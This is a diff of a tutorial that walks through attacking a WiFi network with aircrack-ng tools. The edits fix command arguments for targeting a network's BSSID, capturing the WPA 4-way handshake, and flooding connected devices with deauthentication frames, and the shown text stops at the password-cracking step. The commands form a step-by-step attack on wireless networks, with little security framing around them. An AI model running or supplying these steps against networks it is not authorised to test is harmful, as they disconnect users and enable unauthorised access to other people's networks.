@@ -55,19 +55,19 @@ ctrl+c (stops capturing)
 
 This command will show you one particular wifi network, you have to paste the channel no. and bssid of the particular wifi :
 ```bash
-sudo airodump-ng wlan0mon -c <channel no.> --bssid <bssid> wlan0mon
+sudo airodump-ng wlan0mon -c <channel no.> --bssid <bssid> 
 ```
 
 The next instruction will help you to capture the 4-way handshake.
 You have to specify any name in which the .cap captured flag will be saved
 ```bash
-sudo airodump-ng wlan0mon -c <channel no.> --bssid <bssid> wlan0mon -w <name of the output file>
+sudo airodump-ng wlan0mon -c <channel no.> --bssid <bssid> -w <name of the output file>
 ctrl+c (stop capturing only after getting the 4-way handshake)
 ```
 
 Now open another terminal (terminal 2) and run the following command for deauthenticating the devices connected to the wifi 
 ```bash
-sudo aireplay-ng --deauth 0 -a <bssid> wlan0mon
+sudo aireplay-ng wlan0mon --deauth 0 -a <bssid> 
 ```
 (this command will deauthenticate/disconnect the already connected devices to that wifi. So that we can get the 4-way handshake)
 
@@ -86,7 +86,7 @@ sudo airmon-ng stop wlan0mon
 
 Restart your wifi module :
 ```bash
-sudo service network-manager start 
+sudo service NetworkManager start 
 ```
 
 Start cracking your password :
